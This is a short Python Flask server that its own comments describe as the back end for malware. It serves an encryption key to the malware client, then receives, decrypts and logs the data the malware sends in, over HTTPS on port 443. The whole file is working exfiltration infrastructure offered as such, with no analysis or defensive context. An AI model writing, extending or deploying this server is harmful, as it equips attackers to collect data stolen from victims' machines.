from flask import Flask, request
from cryptography.fernet import Fernet

app = Flask(__name__)
key = Fernet.generate_key()
fernet = Fernet(key)

@app.route('/get_key', methods=['GET'])
def get_key():
    """Send the Fernet key to the client (malware)."""
    return key.decode()

@app.route('/data', methods=['POST'])
def receive_data():
    """Receive and decrypt data sent by the malware."""
    encrypted_data = request.get_data()
    decrypted_data = fernet.decrypt(encrypted_data).decode('utf-8')
    print("Received decrypted data:", decrypted_data)
    # Saving data to a file
    with open('received_data.txt', 'a') as file:
        file.write(decrypted_data + "\n")
    return "Data received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
